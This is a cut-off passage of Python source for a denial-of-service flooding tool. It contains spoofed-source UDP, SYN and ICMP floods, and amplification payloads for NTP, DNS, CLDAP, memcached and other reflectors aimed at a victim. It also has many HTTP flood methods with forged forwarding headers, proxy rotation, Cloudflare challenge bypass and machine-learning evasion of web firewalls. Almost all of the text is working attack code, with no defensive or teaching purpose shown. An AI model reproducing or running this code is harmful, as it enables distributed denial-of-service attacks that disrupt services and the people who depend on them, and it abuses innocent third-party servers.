                        BYTES_SEND += len(payload)
                        REQUESTS_SENT += 1
                    except Exception: continue
        await asyncio.to_thread(_flood)

    async def FIVEMTOKEN(self) -> None:
        token = str(uuid4())
        steamid_min, steamid_max = 76561197960265728, 76561199999999999
        guid = str(randint(steamid_min, steamid_max))
        payload = f"token={token}&guid={guid}".encode("utf-8")
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    async def FIVEM(self) -> None:
        payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    async def TS3(self) -> None:
        payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    async def MCPE(self) -> None:
        payload = b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                await asyncio.sleep(0)
                continue

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []
        methods, paths = (
            ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"],
            [
                "/0/0/0/0/0/0",
                "/0/0/0/0/0/0/",
                "\\0\\0\\0\\0\\0\\0",
                "\\0\\0\\0\\0\\0\\0\\",
                "/",
                "/null",
                "/%00%00%00%00",
            ],
        )
        for _ in range(randint(2, 4)):
            ip, udp = IP(), UDP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])
            payload = (
                f"{randchoice(methods)} {randchoice(paths)}{randbytes(randint(1024, 2048)).decode('latin1', 'ignore')} HTTP/1.1\nHost: {self._target[0]}:{self._target[1]}\r\n\r\n"
            ).encode("latin1", "ignore")
            udp.contains(Data(payload))
            ip.contains(udp)
            packets.append(ip.get_packet())
        return packets

    def _genrate_syn(self) -> bytes:
        ip, tcp = IP(), TCP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip, icmp = IP(), ICMP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        """Pre-calculate amplification packets for high-speed delivery."""
        payloads = []
        for ref in self._ref:
            try:
                ip, ud = IP(), UDP()
                ip.set_ip_src(self._target[0])
                ip.set_ip_dst(ref)
                ud.set_uh_dport(self._amp_payload[1])
                ud.set_uh_sport(self._target[1])
                ud.contains(Data(self._amp_payload[0]))
                ip.contains(ud)
                payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
            except Exception:
                continue
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD, self._target = self.ICMP, (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00",
                        3389,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "CLDAP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00",
                        389,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "MEM":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n", 11211),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "CHAR":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x01", 19),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "ARD":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x00\x14\x00\x00", 3283),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "NTP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x17\x00\x03\x2a\x00\x00\x00\x00", 123),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "DNS":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00",
                        53,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )


class AsyncHTTPManager:
    """Centralized manager for aiohttp sessions to maximize connection reuse."""
    _session: Optional[aiohttp.ClientSession] = None
    _lock = asyncio.Lock()

    @classmethod
    async def get_session(cls) -> aiohttp.ClientSession:
        if cls._session is None or cls._session.closed:
            async with cls._lock:
                if cls._session is None or cls._session.closed:
                    connector = aiohttp.TCPConnector(
                        ssl=False, 
                        limit=0, 
                        ttl_dns_cache=300,
                        use_dns_cache=True
                    )
                    timeout = aiohttp.ClientTimeout(total=10, connect=5)
                    cls._session = aiohttp.ClientSession(
                        connector=connector, 
                        timeout=timeout,
                        headers={"Connection": "keep-alive"}
                    )
        return cls._session

    @classmethod
    async def close(cls):
        if cls._session and not cls._session.closed:
            await cls._session.close()
            cls._session = None


import concurrent.futures

# Global executor for synchronous methods (CFB, BYPASS, DGB)
# This prevents asyncio.to_thread from bottlenecking on the default max_workers limit (which is small).
SYNC_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=2000)

class HttpFlood:
    _cfbuam_cookie: str = None
    _cfbuam_ua: str = None
    _cfbuam_lock = asyncio.Lock()
    
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: asyncio.Event
    _proxy_pool: TacticalProxyPool
    SENT_FLOOD: Any

    def __init__(
        self,
        thread_id: int,
        target: URL,
        host: str,
        method: str = "GET",
        rpc: int = 1,
        synevent: asyncio.Event = None,
        useragents: Set[str] = None,
        referers: Set[str] = None,
        proxy_pool: TacticalProxyPool = None,
    ) -> None:
        self.SENT_FLOOD = None
        (
            self._thread_id,
            self._synevent,
            self._rpc,
            self._method,
            self._target,
            self._host,
            self._proxy_pool,
        ) = (
            thread_id,
            synevent,
            rpc,
            method,
            target,
            host,
            proxy_pool,
        )
        self._raw_target = (self._host, (self._target.port or 80))
        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))
        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
            "HEAD": self.HEAD,
            "IMPERSONATE": self.IMPERSONATE,
            "HTTP3": self.HTTP3,
        }
        if not referers:
            referers = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
            ]
        self._referers = list(referers)
        if not useragents:
            useragents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
                "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
                "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
                "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
                "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_IncredibleS_S710e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            ]
        self._useragents, self._req_type = list(useragents), self.getMethodType(method)
        self._rebuild_payload()

    async def _get_session(self) -> aiohttp.ClientSession:
        """Utilizes the centralized session manager."""
        return await AsyncHTTPManager.get_session()

    def _rebuild_payload(self):
        """Advanced Fingerprinting: Rebuilds payload with dynamic, realistic browser headers."""
        self._method_bytes = self._req_type.encode()
        self._path_bytes = self._target.raw_path_qs.encode()
        self._host_bytes = self._target.authority.encode()
        self._raw_host_bytes = self._target.raw_host.encode()
        self._host_header = b"Host: " + self._host_bytes + b"\r\n"
        
        # Use ML Engine if evasion is enabled
        if "--evasion" in argv:
            best_fp = ML_ENGINE.get_fingerprint()
            self._current_fp_id = best_fp["id"]
            self._current_delay = best_fp["delay"]
            self._fp_headers_bytes = best_fp["headers"].encode()
            self._conn_type_bytes = b"Connection: " + randchoice([b"keep-alive", b"Upgrade"]) + b"\r\n"
            self._useragents_bytes = [ua.encode() for ua in [best_fp["ua"]]]
        else:
            self._current_fp_id = None
            self._current_delay = 0.0
            self._fp_headers_bytes = (
                b"Accept-Encoding: gzip, deflate, br\r\n"
                b"Accept-Language: en-US,en;q=0.9\r\n"
                b"Cache-Control: max-age=0\r\n"
                b"Sec-Fetch-Dest: document\r\n"
                b"Sec-Fetch-Mode: navigate\r\n"
                b"Sec-Fetch-Site: none\r\n"
                b"Sec-Fetch-User: ?1\r\n"
                b"Sec-Gpc: 1\r\n"
                b"Pragma: no-cache\r\n"
                b"Upgrade-Insecure-Requests: 1\r\n"
            )
            self._conn_type_bytes = b"Connection: keep-alive\r\n"
            self._useragents_bytes = [ua.encode() for ua in self._useragents]
        
        self._referers_bytes = [ref.encode() for ref in self._referers]
        self._target_repr_quoted = parse.quote(self._target.human_repr()).encode()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    async def run(self) -> None:
        if self._synevent:
            while not self._synevent.is_set():
                await asyncio.sleep(0.1)
        self.select(self._method)
        original_rpc = self._rpc
        smart_rpc_enabled = "--smart" in argv
        evasion_enabled = "--evasion" in argv
        
        while self._synevent.is_set():
            if evasion_enabled:
                self._rebuild_payload()
                if self._current_delay > 0:
                    await asyncio.sleep(self._current_delay)
                    
            if smart_rpc_enabled:
                # Smart RPC Adjustment
                if CURRENT_LATENCY.value > 2000 or CURRENT_LATENCY.value == -1.0:
                    self._rpc = max(1, original_rpc // 2)
                elif CURRENT_LATENCY.value > 0 and CURRENT_LATENCY.value < 500:
                    self._rpc = original_rpc

            try:
                await self.SENT_FLOOD()
                # If we get here, no direct exception occurred in the flood method
                if evasion_enabled and self._current_fp_id:
                    # Reward or penalize based on latency
                    is_success = (CURRENT_LATENCY.value != -1.0 and CURRENT_LATENCY.value < 3000)
                    await asyncio.to_thread(ML_ENGINE.report_result, self._current_fp_id, is_success)
            except Exception:
                if evasion_enabled and self._current_fp_id:
                    await asyncio.to_thread(ML_ENGINE.report_result, self._current_fp_id, False)
            
            await asyncio.sleep(0) # Yield control to event loop to prevent stalls

    def generate_payload(self, other: bytes = None) -> bytes:
        """High-efficiency byte assembly to minimize CPU overhead in flood loops."""
        spoof = ProxyTools.Random.rand_ipv4().encode()
        
        return b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            self._host_header,
            self._conn_type_bytes,
            b"User-Agent: ", randchoice(self._useragents_bytes), b"\r\n",
            b"Referer: ", randchoice(self._referers_bytes), self._target_repr_quoted, b"\r\n",
            self._fp_headers_bytes,
            b"X-Forwarded-For: ", spoof, b"\r\n",
            b"Client-IP: ", spoof, b"\r\n",
            b"Real-IP: ", spoof, b"\r\n",
            other if other else b"",
            b"\r\n"
        ])

    async def open_connection(self, host=None):
        proxy = None
        if self._proxy_pool:
            proxy = self._proxy_pool.get_proxy()
            
        try:
            if proxy:
                # logger.debug(f"[*] Connecting via proxy: {proxy}")
                sock = await asyncio.to_thread(proxy.open_socket, AF_INET, SOCK_STREAM)
                await asyncio.to_thread(sock.connect, host or self._raw_target)
                sock.setblocking(False)
            else:
                sock = socket(AF_INET, SOCK_STREAM)
                sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                sock.setblocking(False)
                loop = asyncio.get_event_loop()
                await loop.sock_connect(sock, host or self._raw_target)

            if self._target.scheme.lower() == "https":
                reader, writer = await asyncio.open_connection(
                    sock=sock, 
                    ssl=ctx, 
                    server_hostname=self._target.host
                )
            else:
                reader, writer = await asyncio.open_connection(sock=sock)
            
            return reader, writer
        except Exception as e:
            # logger.debug(f"[!] Connection failed: {e}")
            if proxy and self._proxy_pool:
                self._proxy_pool.report_failure(proxy)
            raise

    async def HEAD(self) -> None:
        """High-efficiency HEAD flood."""
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except Exception:
            pass

    _sample_count = 0

    async def _send_async(self, writer: asyncio.StreamWriter, data: bytes, reader: asyncio.StreamReader = None):
        global BYTES_SEND, REQUESTS_SENT, SUCCESS_SENT, WAF_SENT, ERROR_SENT, TIMEOUT_SENT
        try:
            writer.write(data)
            await writer.drain()
            BYTES_SEND += len(data)
            REQUESTS_SENT += 1

            # Sampling: Every 50 requests, try to read the status line if reader is provided
            if reader and HttpFlood._sample_count % 50 == 0:
                try:
                    # Short timeout for sampling to avoid stalling the attack
                    line = await asyncio.wait_for(reader.readline(), timeout=1.0)
                    if line:
                        status_line = line.decode().upper()
                        if "HTTP/" in status_line:
                            parts = status_line.split()
                            if len(parts) >= 2:
                                code = parts[1]
                                if code.startswith(('2', '3')):
                                    SUCCESS_SENT += 1
                                elif code.startswith('4'):
                                    WAF_SENT += 1
                                elif code.startswith('5'):
                                    ERROR_SENT += 1
                except asyncio.TimeoutError:
                    TIMEOUT_SENT += 1
                except:
                    pass
            
            HttpFlood._sample_count += 1
        except (ConnectionResetError, BrokenPipeError, TimeoutError):
            TIMEOUT_SENT += 1
            raise
        except Exception:
            raise

    @property
    def randHeadercontent(self) -> str:
        return (
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
            + self.SpoofIP
        )

    @staticmethod
    def getMethodType(method: str) -> str:
        return (
            "GET"
            if {method.upper()}
            & {
                "CFB",
                "CFBUAM",
                "GET",
                "TOR",
                "COOKIE",
                "OVH",
                "EVEN",
                "DYN",
                "SLOW",
                "PPS",
                "APACHE",
                "BOT",
                "RHEX",
                "STOMP",
            }
            else (
                "POST"
                if {method.upper()} & {"POST", "XMLRPC", "STRESS"}
                else "HEAD" if {method.upper()} & {"GSB", "HEAD"} else "REQUESTS"
            )
        )

    async def POST(self) -> None:
        extra = (
            b"Content-Length: 44\r\n"
            b"X-Requested-With: XMLHttpRequest\r\n"
            b"Content-Type: application/json\r\n\r\n"
            b'{"data": "' + ProxyTools.Random.rand_str(32).encode() + b'"}'
        )
        payload = self.generate_payload(extra)
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target_host = self._target.authority.replace(".onion", provider)
        payload = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", target_host.encode(), b"\r\n",
            b"Connection: keep-alive\r\n\r\n"
        ])
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        try:
            reader, writer = await self.open_connection(target)
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def STRESS(self) -> None:
        extra = (
            b"Content-Length: 524\r\n"
            b"X-Requested-With: XMLHttpRequest\r\n"
            b"Content-Type: application/json\r\n\r\n"
            b'{"data": "' + ProxyTools.Random.rand_str(512).encode() + b'"}'
        )
        payload = self.generate_payload(extra)
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def COOKIES(self) -> None:
        payload = self.generate_payload(
            "Cookie: _ga=GA%s; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n"
            % (
                ProxyTools.Random.rand_int(1000, 99999),
                ProxyTools.Random.rand_str(6),
                ProxyTools.Random.rand_str(32),
            )
        )
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def APACHE(self) -> None:
        payload = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024))
        )
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def XMLRPC(self) -> None:
        payload = self.generate_payload(
            (
                "Content-Length: 345\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n\r\n"
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                "<params><param><value><string>%s</string></value>"
                "</param><param><value><string>%s</string>"
                "</value></param></params></methodCall>"
            )
            % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
        )[:-2]
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def PPS(self) -> None:
        payload = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def KILLER(self) -> None:
        tasks = []
        for _ in range(10):
            tasks.append(asyncio.create_task(self.GET()))
        await asyncio.gather(*tasks)

    async def GET(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except Exception:
            pass

    async def BOT(self) -> None:
        payload = self.generate_payload()
        p1 = b"".join([
            b"GET /robots.txt HTTP/1.1\r\nHost: ", self._target.raw_authority.encode(),
            b"\r\nConnection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\nUser-Agent: ",
            randchoice(search_engine_agents).encode(), b"\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n"
        ])
        p2 = b"".join([
            b"GET /sitemap.xml HTTP/1.1\r\nHost: ", self._target.raw_authority.encode(),
            b"\r\nConnection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: ",
            randchoice(search_engine_agents).encode(), b"\r\nAccept-Encoding: gzip,deflate,br\r\nIf-None-Match: ",
            ProxyTools.Random.rand_str(9).encode(), b"-", ProxyTools.Random.rand_str(4).encode(),
            b"\r\nIf-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                await self._send_async(writer, p1)
                await self._send_async(writer, p2)
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def EVEN(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                while True:
                    await self._send_async(writer, payload, reader)
                    if not await reader.read(1):
                        break
        except: pass

    async def OVH(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(min(self._rpc, 5)):
                    await self._send_async(writer, payload, reader)
        except: pass

    async def CFB(self) -> None:
        """
        Enhanced Cloudflare Bypass: 
        Uses shared cf_clearance cookies if available for high-speed flooding.
        Falls back to synchronous cloudscraper if no clearance is found.
        """
        # If we have a valid clearance from CFBUAM, use the fast path
        if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
            try:
                # Reuse the logic from CFBUAM but optimized for mass-async
                ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
                cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
                spoof = ProxyTools.Random.rand_ipv4().encode()
                ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()

                req = b"".join([
                    self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
                    b"Host: ", self._host_bytes, b"\r\n",
                    cookie_bytes,
                    b"Connection: ", self._conn_type_bytes, b"\r\n",
                    b"User-Agent: ", ua_bytes, b"\r\n",
                    b"Referer: ", ref, b"\r\n",
                    self._fp_headers_bytes,
                    b"X-Forwarded-For: ", spoof, b"\r\n",
                    b"Client-IP: ", spoof, b"\r\n",
                    b"Real-IP: ", spoof, b"\r\n",
                    b"\r\n"
                ])

                reader, writer = await self.open_connection()
                async with writer:
                    for _ in range(self._rpc):
                        await self._send_async(writer, req)
                return
            except Exception:
                pass # Fallback to scraper on connection failure

        # Legacy/Fallback Path: Synchronous Scraper
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_CFB)

    _scraper_cache = {}

    def _sync_CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        
        # Use thread-local or cached scraper to reduce CPU overhead
        thread_id = current_thread().ident
        scraper = HttpFlood._scraper_cache.get(thread_id)
        
        if not scraper:
            try:
                scraper = create_scraper()
                HttpFlood._scraper_cache[thread_id] = scraper
            except Exception:
                return

        for _ in range(self._rpc):
            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
            try:
                res = scraper.get(
                    self._target.human_repr(),
                    proxies=pro.asRequest() if pro else None,
                    timeout=5
                )
                BYTES_SEND += len(res.content) + len(str(res.headers))
                REQUESTS_SENT += 1
            except Exception:
                if pro and self._proxy_pool:
                    self._proxy_pool.report_failure(pro)

    _cfbuam_expiry = 0

    async def CFBUAM(self) -> None:
        """
        Cloudflare UAM Bypass using Headless Browser.
        Solves the JS challenge once globally, then all tasks use the synced cookies.
        """
        now = time()
        # Re-solve if no cookie, fallback cookie detected, or 15 mins passed
        if not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry:
            async with HttpFlood._cfbuam_lock:
                # Double-checked locking with 60s cooldown between re-solve attempts
                if (not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry) and (now - getattr(HttpFlood, '_last_solve_attempt', 0) > 60):
                    HttpFlood._last_solve_attempt = now
                    proxy_str = str(self._proxy_pool.get_proxy()) if self._proxy_pool else None
                    # Try with latest ML User-Agent
                    ua_target = ML_ENGINE.get_fingerprint()["ua"]
                    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
                    
                    if not cookie and proxy_str:
